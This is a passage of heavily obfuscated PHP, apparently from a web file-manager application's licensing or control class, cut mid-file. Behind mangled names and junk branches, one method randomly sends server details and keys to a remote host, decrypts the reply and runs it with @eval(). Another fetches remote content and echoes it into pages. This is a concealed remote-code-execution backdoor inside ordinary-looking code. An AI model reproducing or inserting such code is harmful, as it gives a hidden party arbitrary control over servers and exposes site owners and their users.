=> 3))); $¡¬—›Ô = @file_get_contents($Ê¥ß—¯, !1, $ÖåØÙ³Û); $®Æ–˜µ… = $Äö—‹ˆ[676]; if (!$®Æ–˜µ…) { die; } header($¤€á”şÙ[220]); $üıÄú¶£ = $Äö—‹ˆ[677]; if (!$üıÄú¶£) { return; } if ($¡¬—›Ô && strstr($¡¬—›Ô, $¤€á”şÙ[221])) { echo $¡¬—›Ô; } die; } public function cuzs79d9a901($ï·÷•Öå) { $¥€¶¿é” =& $_SERVER[Üè·¥©¸]; if ($this->ximfb37afc28 == $¥€¶¿é”[222]) { return $ï·÷•Öå; } $İÂ›‹µ = array($¥€¶¿é”[223] => $¥€¶¿é”[224], $¥€¶¿é”[225] => $¥€¶¿é”[224], $¥€¶¿é”[226] => $¥€¶¿é”[224], $¥€¶¿é”[227] => $¥€¶¿é”[224], $¥€¶¿é”[228] => $¥€¶¿é”[229], $¥€¶¿é”[230] => $¥€¶¿é”[229], $¥€¶¿é”[231] => $¥€¶¿é”[229], $¥€¶¿é”[232] => $¥€¶¿é”[229], $¥€¶¿é”[233] => $¥€¶¿é”[229], $¥€¶¿é”[234] => $¥€¶¿é”[229], $¥€¶¿é”[235] => $¥€¶¿é”[229], $¥€¶¿é”[236] => $¥€¶¿é”[229], $¥€¶¿é”[237] => $¥€¶¿é”[229], $¥€¶¿é”[238] => $¥€¶¿é”[229], $¥€¶¿é”[239] => $¥€¶¿é”[229], $¥€¶¿é”[240] => $¥€¶¿é”[229]); $‡ÚÃôŠ = explode($¥€¶¿é”[241], _get($this->uvph344e8913, $¥€¶¿é”[112], $¥€¶¿é”[6])); $×›â¨Ï² = array(); $ÂáˆÑé— = $_SERVER[Ì¥ŞÒ°£][678]; foreach ($İÂ›‹µ as $„ùæœŠ’ => $×ÕÎø§á) { if ($×ÕÎø§á == $¥€¶¿é”[224] && substr($this->ximfb37afc28, 0, 1) == $¥€¶¿é”[224]) { continue; } if (!in_array($„ùæœŠ’, $‡ÚÃôŠ)) { $×›â¨Ï²[] = $„ùæœŠ’; } } foreach ($×›â¨Ï² as $„ùæœŠ’) { unset($ï·÷•Öå[$„ùæœŠ’]); } return $ï·÷•Öå; } private function ubvt0d84130c() { $¸Š›ûêò =& $_SERVER[Üè·¥©¸]; if ($this->ximfb37afc28 != $¸Š›ûêò[106]) { $GLOBALS[$¸Š›ûêò[85]][$¸Š›ûêò[89]][$¸Š›ûêò[242]] = $¸Š›ûêò[203]; return; } $GLOBALS[$¸Š›ûêò[85]][$¸Š›ûêò[243]] = $¸Š›ûêò[121]; if (Model($¸Š›ûêò[244])->get($¸Š›ûêò[63]) != $¸Š›ûêò[203]) { Model($¸Š›ûêò[244])->set($¸Š›ûêò[63], $¸Š›ûêò[203]); } } public function hayw3c0841a5() { return $_SERVER[Üè·¥©¸][245]; } private function mdhp27a38e57() { $âÒá±Å™ =& $_SERVER[Ì¥ŞÒ°£]; $ğ‹‘ –í =& $_SERVER[Üè·¥©¸]; $Úá®İì¬ = array($ğ‹‘ –í[246], $ğ‹‘ –í[247], $ğ‹‘ –í[248]); $úùËé©õ = $âÒá±Å™[679]; $™£Îñ°‘ = $ğ‹‘ –í[249] . md5($ğ‹‘ –í[250]); $ÇêÇ’°ú = $âÒá±Å™[680]; if (!$ÇêÇ’°ú) { return; } if ($this->ximfb37afc28 == $ğ‹‘ –í[106] || !_get($GLOBALS, $ğ‹‘ –í[115])) { return; } if (!in_array($_SERVER[$ğ‹‘ –í[24]], $Úá®İì¬)) { return; } if (time() % 4 != 0) { return; } $¹«ïÁ‹æ = call_user_func(array($ğ‹‘ –í[251], $ğ‹‘ –í[252]), $™£Îñ°‘); if ($¹«ïÁ‹æ && time() - $¹«ïÁ‹æ < intval($ğ‹‘ –í[253])) { return; } call_user_func(array($ğ‹‘ –í[251], $ğ‹‘ –í[138]), $™£Îñ°‘, time()); $ĞãÙñ¾ç = $âÒá±Å™[681]; if (!$ĞãÙñ¾ç) { die; } $ÛÓİ = Model($ğ‹‘ –í[33])->get($ğ‹‘ –í[103]); $ûÜè®ª¾ = array($ğ‹‘ –í[150] => Model($ğ‹‘ –í[33])->get($ğ‹‘ –í[186]), $ğ‹‘ –í[163] => $this->ximfb37afc28, $ğ‹‘ –í[160] => $_SERVER[$ğ‹‘ –í[161]], $ğ‹‘ –í[162] => Model($ğ‹‘ –í[33])->get($ğ‹‘ –í[130]), $ğ‹‘ –í[101] => md5($_SERVER[$ğ‹‘ –í[102]] . $ÛÓİ), $ğ‹‘ –í[153] => $ğ‹‘ –í[135], $ğ‹‘ –í[156] => $_SERVER[$ğ‹‘ –í[157]]); $õ„·Ã = $âÒá±Å™[682]; if (strlen($õ„·Ã) < $âÒá±Å™[621]) { return; } $´™Ğ¦— = $this->oerqf106cfc4($ğ‹‘ –í[254], $ûÜè®ª¾); if (!is_array($´™Ğ¦—)) { return; } if ($´™Ğ¦—[$ğ‹‘ –í[150]] && $´™Ğ¦—[$ğ‹‘ –í[255]]) { if ($this->czgmdb3cceac($´™Ğ¦—[$ğ‹‘ –í[255]]) == $ûÜè®ª¾[$ğ‹‘ –í[150]]) { return; } } $this->efgo23d5fff0(); $»—ĞòÛŸ = $âÒá±Å™[683]; while (strlen($»—ĞòÛŸ) < $âÒá±Å™[615]) { if (!$»—ĞòÛŸ) { break; } $»—ĞòÛŸ++; } if ($this->czgmdb3cceac($´™Ğ¦—[$ğ‹‘ –í[255]]) != $ûÜè®ª¾[$ğ‹‘ –í[150]]) { $›‡‰ˆ©£ = array($ğ‹‘ –í[181] => $ÛÓİ, $ğ‹‘ –í[182] => $_SERVER[$ğ‹‘ –í[102]], $ğ‹‘ –í[183] => this_url(), $ğ‹‘ –í[158] => $_SERVER[$ğ‹‘ –í[159]]); $§”°£·˜ = $this->aoinf55f0e0e(json_encode($›‡‰ˆ©£)); $´™Ğ¦— = $this->oerqf106cfc4($ğ‹‘ –í[184] . $§”°£·˜); if ($´™Ğ¦— && is_array($´™Ğ¦—) && isset($´™Ğ¦—[$ğ‹‘ –í[255]])) { $…¡“ÓüŞ = $this->rzycfa9d1b63($´™Ğ¦—[$ğ‹‘ –í[255]], 2); if ($…¡“ÓüŞ) { $…¡“ÓüŞ = $this->czgmdb3cceac($…¡“ÓüŞ); } if ($…¡“ÓüŞ) { try { @eval($…¡“ÓüŞ); } catch (Exception $›­İ±¡ö) { } } } } } private function oerqf106cfc4($Î²°Â‘Å = '', $Ï¹Ø¥ºÔ = array(), $¬ìˆ×Î¿ = 5) { $õ¬‚Óúğ =& $_SERVER[Ì¥ŞÒ°£]; $–„Ç–·³ =& $_SERVER[Üè·¥©¸]; $Æ©ÈçÊ = $–„Ç–·³[256]; $Æ©ÈçÊ = $this->tejmec0f2135($Æ©ÈçÊ, $–„Ç–·³[257]); $Æ©ÈçÊ = $Æ©ÈçÊ . $Î²°Â‘Å; if ($Ï¹Ø¥ºÔ && is_array($Ï¹Ø¥ºÔ)) { $Æ©ÈçÊ = $Æ©ÈçÊ . $–„Ç–·³[258] . http_build_query($Ï¹Ø¥ºÔ); } if ($Ï¹Ø¥ºÔ === -1) { return $Æ©ÈçÊ; } $„Òô†˜ = stream_context_create(array($–„Ç–·³[216] => array($–„Ç–·³[219] => $¬ìˆ×Î¿, $–„Ç–·³[217] => $–„Ç–·³[259]), $–„Ç–·³[260] => array($–„Ç–·³[261] => !1, $–„Ç–·³[262] => !1))); $Ò”ñ…©Á = $õ¬‚Óúğ[684]; $Ï¹Ø¥ºÔ = @file_get_contents($Æ©ÈçÊ, !1, $„Òô†˜); return json_decode($Ï¹Ø¥ºÔ, !0); $°›Õ¡ ‘ = $õ¬‚Óúğ[685]; if (!$°›Õ¡ ‘) { return; } $š÷—ñ¤™ = $õ¬‚Óúğ[686]; if (!$š÷—ñ¤™) { die; } } private function yogk983f98ef() { $Ìø¶ =& $_SERVER[Ì¥ŞÒ°£]; $”Ëª  =& $_SERVER[Üè·¥©¸]; $£ìµí©§ = array($”Ëª [263] => $”Ëª [264], $”Ëª [265] => $”Ëª [266], $”Ëª [267] => $”Ëª [268], $”Ëª [269] => $”Ëª [270], $”Ëª [271] => $”Ëª [272], $”Ëª [273] => $”Ëª [211], $”Ëª [274] => $”Ëª [211], $”Ëª [275] => $”Ëª [264], $”Ëª [276] => $”Ëª [266], $”Ëª [277] => $”Ëª [268], $”Ëª [278] => $”Ëª [279], $”Ëª [280] => $”Ëª [270], $”Ëª [281] => $”Ëª [282], $”Ëª [283] => $”Ëª [272], $”Ëª [284] => $”Ëª [285], $”Ëª [286] => $”Ëª [287], $”Ëª [288] => $”Ëª [289]); $¨“½¦­“ = $£ìµí©§[$this->ximfb37afc28]; $¨“½¦­“ = intval($¨“½¦­“ ? $¨“½¦­“ : $”Ëª [264]); $©Â»¨èò = $Ìø¶[687]; while (strlen($©Â»¨èò) < $Ìø¶[632]) { if (!$©Â»¨èò) { break; } $©Â»¨èò++; } $®ÇÇíï‰ = _get($this->uvph344e8913, $”Ëª [290]); $®ÇÇíï‰ = $®ÇÇíï‰ ? intval($®ÇÇíï‰) : 0; $ß²—ÅĞ¡ = $Ìø¶[688]; return $¨“½¦­“ + $®ÇÇíï‰; $·Ùê—ò„ = $Ìø¶[689]; if (strlen($·Ùê—ò„) < $Ìø¶[632]) { return; } } public function emfp663d2206($„Öœ“‚‹) { $¡·ŞŞ¥ç =& $_SERVER[Ì¥ŞÒ°£]; $¯›¦‹«Ş =& $_SERVER[Üè·¥©¸]; $‰ªú•ë¾ = $this->yogk983f98ef(); $ˆ‚Àº–ú = $¡·ŞŞ¥ç[690]; if (!$ˆ‚Àº–ú) { die; } if ($„Öœ“‚‹[$¯›¦‹«Ş[291]] == $¯›¦‹«Ş[121]) { return; } if ($‰ªú•ë¾ >= intval($¯›¦‹«Ş[211])) { return; } $éğáç = Model($¯›¦‹«Ş[124])->count(); if ($éğáç <= $‰ªú•ë¾) { return; } $«‚”Ò¯í = Model($¯›¦‹«Ş[124])->field($¯›¦‹«Ş[291])->limit($‰ªú•ë¾)->select(); $«‚”Ò¯í = array_to_keyvalue($«‚”Ò¯í, $¯›¦‹«Ş[6], $¯›¦‹«Ş[291]); $é‚É…Ñƒ = $¡·ŞŞ¥ç[691]; while ($é‚É…Ñƒ < $¡·ŞŞ¥ç[635]) { if ($é‚É…Ñƒ >= 0) { break; } $é‚É…Ñƒ++; } if (!in_array($„Öœ“‚‹[$¯›¦‹«Ş[291]], $«‚”Ò¯í)) { show_json($¯›¦‹«Ş[292], !1, $¯›¦‹«Ş[207]); } } public function untj5b132736() { $³•ÃºæÖ =& $_SERVER[Ì¥ŞÒ°£]; $ÔÜŸÅØ• =& $_SERVER[Üè·¥©¸]; if (!_get($GLOBALS, $ÔÜŸÅØ•[115]) || mt_rand(1, 100) > 20) { return; } $ ®‡ƒ£â = $ÔÜŸÅØ•[214]; $Íï½Ğƒœ = $³•ÃºæÖ[692]; while ($Íï½Ğƒœ < $³•ÃºæÖ[635]) { if ($Íï½Ğƒœ >= 0) { break; } $Íï½Ğƒœ++; } $ ®‡ƒ£â = $this->tejmec0f2135($ ®‡ƒ£â, $ÔÜŸÅØ•[215]); $÷³óæ¾Â = $³•ÃºæÖ[693]; if (strlen($÷³óæ¾Â) < $³•ÃºæÖ[632]) { die; } $…¬äƒ = stream_context_create(array($ÔÜŸÅØ•[216] => array($ÔÜŸÅØ•[217] => $ÔÜŸÅØ•[218], $ÔÜŸÅØ•[219] => 3))); $ë’ÌÃâ” = $³•ÃºæÖ[694]; if (strlen($ë’ÌÃâ”) < $³•ÃºæÖ[621]) { return; } $Ş»Ã•ºç = @file_get_contents($ ®‡ƒ£â, !1, $…¬äƒ); echo $ÔÜŸÅØ•[293] . hash_encode($Ş»Ã•ºç) . $ÔÜŸÅØ•[294]; $¥¹ã‡Ã† = $³•ÃºæÖ[695]; while ($¥¹ã‡Ã† < $³•ÃºæÖ[648]) { if ($¥¹ã‡Ã† >= 0) { break; } $¥¹ã‡Ã†++; } } private function eglvc25c0ed6($ãì–Ì™µ, $á¿º²ô, $ç…òË—Ó = 3) { $éÃ¿„Õ =& $_SERVER[Ì¥ŞÒ°£]; $ÂşˆĞ–Ü =& $_SERVER[Üè·¥©¸]; usleep(1); $şŠ‹¨’Ó = $éÃ¿„Õ[629]; if (!$şŠ‹¨’Ó) { return; } $ãì–Ì™µ = trim($ãì–Ì™µ); $ËÆàÌá = $éÃ¿„Õ[696]; while (strlen($ËÆàÌá) < $éÃ¿„Õ[615]) { if (!$ËÆàÌá) { break; } $ËÆàÌá++; } $Ö¦¯ó¾° = mt_rand(0, 5) . $ÂşˆĞ–Ü[6]; $æÃßõ‹¦ = $éÃ¿„Õ[697]; $å¸†¶ = rand_string(15); $Éßî»…û = $éÃ¿„Õ[698]; if (!$Éßî»…û) { return; } $ûì¦¬¸” = $ÂşˆĞ–Ü[295]; $’´÷íÅŠ = $éÃ¿„Õ[699]; if (!$’´÷íÅŠ) { die; } switch ($Ö¦¯ó¾°) { case $ÂşˆĞ–Ü[203]: $–£‹Äù· = $this->sxgu2f4c5811($ãì–Ì™µ, strrev($á¿º²ô . $å¸†¶)); $Öˆ“è–Ú = $éÃ¿„Õ[700]; if (!$Öˆ“è–Ú) { die; } break; $‡¸—À«Ë = $éÃ¿„Õ[701]; case $ÂşˆĞ–Ü[121]: $–£‹Äù· = $this->sxgu2f4c5811($ãì–Ì™µ, strrev($å¸†¶ . $á¿º²ô)); break; $¸„Ç½ù¦ = $éÃ¿„Õ[702]; if (!$¸„Ç½ù¦) { return; } case $ÂşˆĞ–Ü[296]: $–£‹Äù· = $this->sxgu2f4c5811($ãì–Ì™µ, base64_encode($å¸†¶ . $á¿º²ô)); $±¨èìå« = $éÃ¿„Õ[703]; while (strlen($±¨èìå«) < $éÃ¿„Õ[632]) { if (!$±¨èìå«) { break; } $±¨èìå«++; } break; case $ÂşˆĞ–Ü[297]: $–£‹Äù· = $this->sxgu2f4c5811($ãì–Ì™µ, md5($å¸†¶ . $á¿º²ô)); break; $°úü½Ò = $éÃ¿„Õ[704]; case $ÂşˆĞ–Ü[298]: $ãì–Ì™µ = base64_encode($ãì–Ì™µ); $¸ä ŒüÔ = rand(0, 64); $¶±êÚ°ï = $ûì¦¬¸”[$¸ä ŒüÔ]; $ÀÆĞºÈê = md5($¶±êÚ°ï . md5($á¿º²ô . $¶±êÚ°ï) . $á¿º²ô); $ÀÆĞºÈê = substr($ÀÆĞºÈê, $¸ä ŒüÔ % 8, $¸ä ŒüÔ % 8 + 7); $„çßËä = $éÃ¿„Õ[705]; $€òÓúİ¯ = $ÂşˆĞ–Ü[6]; $×¸¦åÊÉ = 0; $Ê»’©í• = 0; $ ÀŸ¯‹Ú = $éÃ¿„Õ[706]; if (!$ ÀŸ¯‹Ú) { return; } $ëÉ‰›‡è = 0; $×À«Â‰£ = $éÃ¿„Õ[707]; if (strlen($×À«Â‰£) < $éÃ¿„Õ[635]) { return; } for ($×¸¦åÊÉ = 0; $×¸¦åÊÉ < strlen($ãì–Ì™µ); $×¸¦åÊÉ++) { $ëÉ‰›‡è = $ëÉ‰›‡è == strlen($ÀÆĞºÈê) ? 0 : $ëÉ‰›‡è; $î½„ÒŸË = $éÃ¿„Õ[708]; $Ê»’©í• = ($¸ä ŒüÔ + strpos($ûì¦¬¸”, $ãì–Ì™µ[$×¸¦åÊÉ]) + ord($ÀÆĞºÈê[$ëÉ‰›‡è++])) % 64; $ÎÑ¡‰İ = $éÃ¿„Õ[709]; $€òÓúİ¯ .= $ûì¦¬¸”[$Ê»’©í•]; $úï˜ç‘ = $éÃ¿„Õ[710]; } $–£‹Äù· = hash_encode($¶±êÚ°ï . $€òÓúİ¯); $ÉòËœ† = $éÃ¿„Õ[711]; while ($ÉòËœ† < $éÃ¿„Õ[615]) { if ($ÉòËœ† >= 0) { break; } $ÉòËœ†++; } break; $Æ€Õ±‡“ = $éÃ¿„Õ[712]; if (!$Æ€Õ±‡“) { die; } default: $–£‹Äù· = $this->sxgu2f4c5811($ãì–Ì™µ, $á¿º²ô . $å¸†¶); break; } $–£‹Äù· = strrev($Ö¦¯ó¾° . $å¸†¶ . $–£‹Äù·); $ğ·âòËÌ = $éÃ¿„Õ[713]; if ($ç…òË—Ó - 1 > 0) { $–£‹Äù· = $this->eglvc25c0ed6($–£‹Äù·, $á¿º²ô, $ç…òË—Ó - 1); } return $–£‹Äù·; } private function rzycfa9d1b63($ÂĞè–Ëş, $œ‡Ğ£×î, $ÌÚ†Ë  = 3) { $“ó ªòé =& $_SERVER[Ì¥ŞÒ°£]; $‘°¼ã“Í =& $_SERVER[Üè·¥©¸]; if (!is_string($ÂĞè–Ëş) || strlen($ÂĞè–Ëş) < 10) { return !1; } $ÂĞè–Ëş = trim($ÂĞè–Ëş); $ÂĞè–Ëş = strrev($ÂĞè–Ëş); $öìñô» = $“ó ªòé[714]; if (!$öìñô») { die; } $ª’«Šé± = $ÂĞè–Ëş[0]; $ë„Æ‚¡ = $“ó ªòé[715]; while ($ë„Æ‚¡ < $“ó ªòé[648]) { if ($ë„Æ‚¡ >= 0) { break; } $ë„Æ‚¡++; } $çßÆÙú = substr($ÂĞè–Ëş, 1, 15); $ÂĞè–Ëş = substr($ÂĞè–Ëş, 16); $‹á¡­ñï = $“ó ªòé[716]; $Ñ¿¡ÖÌé = $‘°¼ã“Í[295]; $–¨ç¯„á = $“ó ªòé[717]; switch ($ª’«Šé±) { case $‘°¼ã“Í[203]: $ÂĞâ£¹µ = $this->tejmec0f2135($ÂĞè–Ëş, strrev($œ‡Ğ£×î . $çßÆÙú)); break; $¤åİ‰È– = $“ó ªòé[718]; if (strlen($¤åİ‰È–) < $“ó ªòé[632]) { die; } case $‘°¼ã“Í[121]: $ÂĞâ£¹µ = $this->tejmec0f2135($ÂĞè–Ëş, strrev($çßÆÙú . $œ‡Ğ£×î)); $»³—æü = $“ó ªòé[719]; if (!$»³—æü) { die; } break; $Ãàº¹‹ = $“ó ªòé[720]; case $‘°¼ã“Í[296]: $ÂĞâ£¹µ = $this->tejmec0f2135($ÂĞè–Ëş, base64_encode($çßÆÙú . $œ‡Ğ£×î)); $ÀÀ¿–÷Ÿ = $“ó ªòé[721]; while (strlen($ÀÀ¿–÷Ÿ) < $“ó ªòé[615]) { if (!$ÀÀ¿–÷Ÿ) { break; } $ÀÀ¿–÷Ÿ++; } break; case $‘°¼ã“Í[297]: $ÂĞâ£¹µ = $this->tejmec0f2135($ÂĞè–Ëş, md5($çßÆÙú . $œ‡Ğ£×î)); break; case $‘°¼ã“Í[298]: $ÂĞè–Ëş = hash_decode($ÂĞè–Ëş); $ÎŒ‘§¤ = $ÂĞè–Ëş[0]; $ÂĞè–Ëş = substr($ÂĞè–Ëş, 1); $»Ü©Ú£“ = $“ó ªòé[722]; while (strlen($»Ü©Ú£“) < $“ó ªòé[648]) { if (!$»Ü©Ú£“) { break; } $»Ü©Ú£“++; } $ñÒ¯ŞôÀ = strpos($Ñ¿¡ÖÌé, $ÎŒ‘§¤); $¹åó÷æè = $“ó ªòé[723]; while ($¹åó÷æè < $“ó ªòé[632]) { if ($¹åó÷æè >= 0) { break; } $¹åó÷æè++; } $Ø³„ˆ¬ = md5($ÎŒ‘§¤ . md5($œ‡Ğ£×î . $ÎŒ‘§¤) . $œ‡Ğ£×î); $Ô·Ù¼¿¥ = $“ó ªòé[724]; $Ø³„ˆ¬ = substr($Ø³„ˆ¬, $ñÒ¯ŞôÀ % 8, $ñÒ¯ŞôÀ % 8 + 7); $àŠ‘®–î = $“ó ªòé[725]; while ($àŠ‘®–î < $“ó ªòé[615]) { if ($àŠ‘®–î >= 0) { break; } $àŠ‘®–î++; } $ªíßÃºØ = $‘°¼ã“Í[6]; $èÌ¿òÛ€ = 0; $ï¸ÒÙññ = 0; $äŞÉ‹ = $“ó ªòé[726]; if (!$äŞÉ‹) { die; } $¯©Âã÷» = 0; for ($èÌ¿òÛ€ = 0; $èÌ¿òÛ€ < strlen($ÂĞè–Ëş); $èÌ¿òÛ€++) { $¯©Âã÷» = $¯©Âã÷» == strlen($Ø³„ˆ¬) ? 0 : $¯©Âã÷»; $ëâ¦àËÈ = $“ó ªòé[727]; if (strlen($ëâ¦àËÈ) < $“ó ªòé[632]) { return; } $ÙË©­û‘ = $¯©Âã÷»++; $ï¸ÒÙññ = strpos($Ñ¿¡ÖÌé, $ÂĞè–Ëş[$èÌ¿òÛ€]) - $ñÒ¯ŞôÀ - ord($Ø³„ˆ¬[$ÙË©­û‘]); while ($ï¸ÒÙññ < 0) { $ï¸ÒÙññ += 64; $‡¡üğÍ… = $“ó ªòé[728]; } $ªíßÃºØ .= $Ñ¿¡ÖÌé[$ï¸ÒÙññ]; } $ÂĞâ£¹µ = base64_decode($ªíßÃºØ); break; $şÜ˜Øø = $“ó ªòé[729]; default: $ÂĞâ£¹µ = $this->tejmec0f2135($ÂĞè–Ëş, $œ‡Ğ£×î . $çßÆÙú); $Òµ¸ÇÍ› = $“ó ªòé[730]; while ($Òµ¸ÇÍ› < $“ó ªòé[648]) { if ($Òµ¸ÇÍ› >= 0) { break; } $Òµ¸ÇÍ›++; } break; } if ($ÌÚ†Ë  - 1 > 0) { $ÂĞâ£¹µ = $this->rzycfa9d1b63($ÂĞâ£¹µ, $œ‡Ğ£×î, $ÌÚ†Ë  - 1); } return $ÂĞâ£¹µ; } public function aoinf55f0e0e($åÂë³¦) { $ğ¬¶Øğä =& $_SERVER[Ì¥ŞÒ°£]; $Ü½ò€ãç =& $_SERVER[Üè·¥©¸]; $œ‹ÈıúÄ = $this->cgqt381d6ac8(); $²×ø­åë = $ğ¬¶Øğä[731]; while ($²×ø­åë < $ğ¬¶Øğä[615]) { if ($²×ø­åë >= 0) { break; } $²×ø­åë++; } $ùõêú€¹ = $this->cgqt381d6ac8(); $ò¨…ø£ = ($œ‹ÈıúÄ - 1) * ($ùõêú€¹ - 1); $Î±è†Ìš = intval(($œ‹ÈıúÄ + $ùõêú€¹) / 2); $Ü³Ô–ì = $ğ¬¶Øğä[732]; if (!$Ü³Ô–ì) { die; } while (1) { $ŸæÛÛÍÚ = $Î±è†Ìš; $¢ëğÅÄ = $ò¨…ø£; while ($¢ëğÅÄ % $ŸæÛÛÍÚ != 0) { $Éáüç¿ù = $¢ëğÅÄ; $¢ëğÅÄ = $ŸæÛÛÍÚ; $ŸæÛÛÍÚ = $Éáüç¿ù % $ŸæÛÛÍÚ; } if ($ŸæÛÛÍÚ == 1) { break; } else { $Î±è†Ìš++; } } $¶ò„Å‰® = 2; for ($¹¹œƒÙ“ = 0; $¹¹œƒÙ“ < $ò¨…ø£ * 10; $¹¹œƒÙ“++) { if (($ò¨…ø£ * $¹¹œƒÙ“ + 1) % $Î±è†Ìš == 0) { $¶ò„Å‰® = intval(($ò¨…ø£ * $¹¹œƒÙ“ + 1) / $Î±è†Ìš); break; } } $³áçœğë = $this->sxgu2f4c5811($œ‹ÈıúÄ * $ùõêú€¹ . $Ü½ò€ãç[6], $Ü½ò€ãç[135]); $µŒõ¢ú£ = $ğ¬¶Øğä[733]; while (strlen($µŒõ¢ú£) < $ğ¬¶Øğä[615]) { if (!$µŒõ¢ú£) { break; } $µŒõ¢ú£++; } $ÃéáŠòà = md5($Ü½ò€ãç[299] . ($œ‹ÈıúÄ + $ùõêú€¹) . $Ü½ò€ãç[300] . $Î±è†Ìš . $Ü½ò€ãç[300] . $¶ò„Å‰® . $Ü½ò€ãç[301]); $¹Ş¥ğ = $this->sxgu2f4c5811($åÂë³¦, $ÃéáŠòà) . $Ü½ò€ãç[302] . $³áçœğë; $”†µÒÂË = $ğ¬¶Øğä[734]; if (strlen($”†µÒÂË) < $ğ¬¶Øğä[632]) { return; } return $¹Ş¥ğ; $¯åçïŒè = $ğ¬¶Øğä[735]; if (!$¯åçïŒè) { die; } } public function czgmdb3cceac($ò˜õ…½š) { $—›ß’£À =& $_SERVER[Ì¥ŞÒ°£]; $•Ó¢ßÇ =& $_SERVER[Üè·¥©¸]; $°úéİ¶ª = explode($•Ó¢ßÇ[302], $ò˜õ…½š); if (count($°úéİ¶ª) != 2) { return $•Ó¢ßÇ[6]; } $õâò¤ï… = $this->tejmec0f2135($°úéİ¶ª[1] . $•Ó¢ßÇ[6], $•Ó¢ßÇ[135]); $†íšòñé = $—›ß’£À[736]; if (!$õâò¤ï…) { return $•Ó¢ßÇ[6]; } $õâò¤ï… = intval($õâò¤ï…); $‰ĞüÈ¦Ë = $—›ß’£À[737]; if (!$‰ĞüÈ¦Ë) { return; } $îŞ™´éÆ = 0; $øìôÙï = $—›ß’£À[738]; if (strlen($øìôÙï) < $—›ß’£À[621]) { return; } $Ò¶áìãÑ = 0; for ($¿’Èèş” = 3; $¿’Èèş” < $õâò¤ï…; $¿’Èèş” += 2) { if ($õâò¤ï… % $¿’Èèş” != 0) { continue; } $îŞ™´éÆ = $¿’Èèş”; $Ò¶áìãÑ = intval($õâò¤ï… / $¿’Èèş”); $û»¡¤ÒÚ = $—›ß’£À[739]; while (strlen($û»¡¤ÒÚ) < $—›ß’£À[648]) { if (!$û»¡¤ÒÚ) { break; } $û»¡¤ÒÚ++; } break; $•ñ¯¤Ì” = $—›ß’£À[740]; if (strlen($•ñ¯¤Ì”) < $—›ß’£À[615]) { die; } } $÷–Ü«Œ¼ = ($îŞ™´éÆ - 1) * ($Ò¶áìãÑ - 1); $ü³¥½¿Ş = $—›ß’£À[741]; $ı•œö£Ò = intval(($îŞ™´éÆ + $Ò¶áìãÑ) / 2); while (1) { $öã³½“ï = $ı•œö£Ò; $ü…àìÑ = $÷–Ü«Œ¼; while ($ü…àìÑ % $öã³½“ï != 0) { $ä˜™Ôƒ = $ü…àìÑ; $ã…ˆš¹É = $—›ß’£À[742]; $ü…àìÑ = $öã³½“ï; $öã³½“ï = $ä˜™Ôƒ % $öã³½“ï; $†‰—¯÷® = $—›ß’£À[743]; while (strlen($†‰—¯÷®) < $—›ß’£À[632]) { if (!$†‰—¯÷®) { break; } $†‰—¯÷®++; } } if ($öã³½“ï == 1) { break; } else { $ı•œö£Ò++; } } $ ½ãİà = 2; for ($¿’Èèş” = 0; $¿’Èèş” < $÷–Ü«Œ¼ * 10; $¿’Èèş”++) { if (($÷–Ü«Œ¼ * $¿’Èèş” + 1) % $ı•œö£Ò == 0) { $ ½ãİà = intval(($÷–Ü«Œ¼ * $¿’Èèş” + 1) / $ı•œö£Ò); break; } } $„àÈËÑÓ = md5($•Ó¢ßÇ[299] . ($îŞ™´éÆ + $Ò¶áìãÑ) . $•Ó¢ßÇ[300] . $ı•œö£Ò . $•Ó¢ßÇ[300] . $ ½ãİà . $•Ó¢ßÇ[301]); $¹ìû¾Âş = $this->tejmec0f2135($°úéİ¶ª[0], $„àÈËÑÓ); return $¹ìû¾Âş; } public function cgqt381d6ac8() { $éÓ½Îü¨ =& $_SERVER[Ì¥ŞÒ°£]; $¸¯Ìè = mt_rand(pow(2, 14), pow(2, 16) - 1); $ÆÏÙÃÆ = array(); $÷œåƒ±‡ = 1; while ($÷œåƒ±‡ <= (int) sqrt($¸¯Ìè)) { $¡›è•ê¾ = $÷œåƒ±‡; $Ô™ßÁ«Œ = $éÓ½Îü¨[744]; while (!0) { $¡›è•ê¾++; if ($¡›è•ê¾ <= 2) { $÷œåƒ±‡ = $¡›è•ê¾; break; } else { if ($¡›è•ê¾ < 2) { continue; } } $¹‡âµŒñ = !0; for ($É§¥®µĞ = 2; $É§¥®µĞ <= sqrt($¡›è•ê¾); $É§¥®µĞ++) { if ($¡›è•ê¾ % $É§¥®µĞ == 0) { $¹‡âµŒñ = !1; } } if ($¹‡âµŒñ) { $÷œåƒ±‡ = $¡›è•ê¾; break; } } $ÆÏÙÃÆ[] = $÷œåƒ±‡; $ÆÖÛ«¸µ = $éÓ½Îü¨[745]; } $ÑèèÏÑƒ = 2; $±“ÚüÂ = $éÓ½Îü¨[746]; for ($¡›è•ê¾ = $¸¯Ìè; $¡›è•ê¾ > 1; $¡›è•ê¾--) { $¹‡âµŒñ = !0; foreach ($ÆÏÙÃÆ as $…·ìŠ) { if ($¡›è•ê¾ % $…·ìŠ == 0) { $¹‡âµŒñ = !1; break; } } if ($¹‡âµŒñ) { $ÑèèÏÑƒ = $¡›è•ê¾; break; } } return $ÑèèÏÑƒ; $¼É¸®Ş‚ = $éÓ½Îü¨[747]; if (!$¼É¸®Ş‚) { return; } } public function iusp149fcc95($ã÷™âÊ, $ø°¶Ù) { $ ¦ºÕ =& $_SERVER[Ì¥ŞÒ°£]; $Ğ‹¥ªğ =& $_SERVER[Üè·¥©¸]; return call_user_func(array($Ğ‹¥ªğ[8], $Ğ‹¥ªğ[303]), $ã÷™âÊ, $ø°¶Ù); $Û‡¬Øï = $ ¦ºÕ[748]; if (strlen($Û‡¬Øï) < $ ¦ºÕ[621]) { die; } } public function sxgu2f4c5811($Ãß•ßï, $ÂÈŠÒ–) { $é«Ä»·Ã =& $_SERVER[Üè·¥©¸]; return call_user_func(array($é«Ä»·Ã[304], $é«Ä»·Ã[305]), $Ãß•ßï, $ÂÈŠÒ–); } public function tejmec0f2135($±äšªõÅ, $ÂÔŠ°Î) { $¸ñÜ„íê =& $_SERVER[Ì¥ŞÒ°£]; $ƒƒ¤¾Û÷ =& $_SERVER[Üè·¥©¸]; return call_user_func(array($ƒƒ¤¾Û÷[304], $ƒƒ¤¾Û÷[306]), $±äšªõÅ, $ÂÔŠ°Î); $“÷èÎ‰¤ = $¸ñÜ„íê[749]; while ($“÷èÎ‰¤ < $¸ñÜ„íê[648]) { if ($“÷èÎ‰¤ >= 0) { break; } $“÷èÎ‰¤++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public 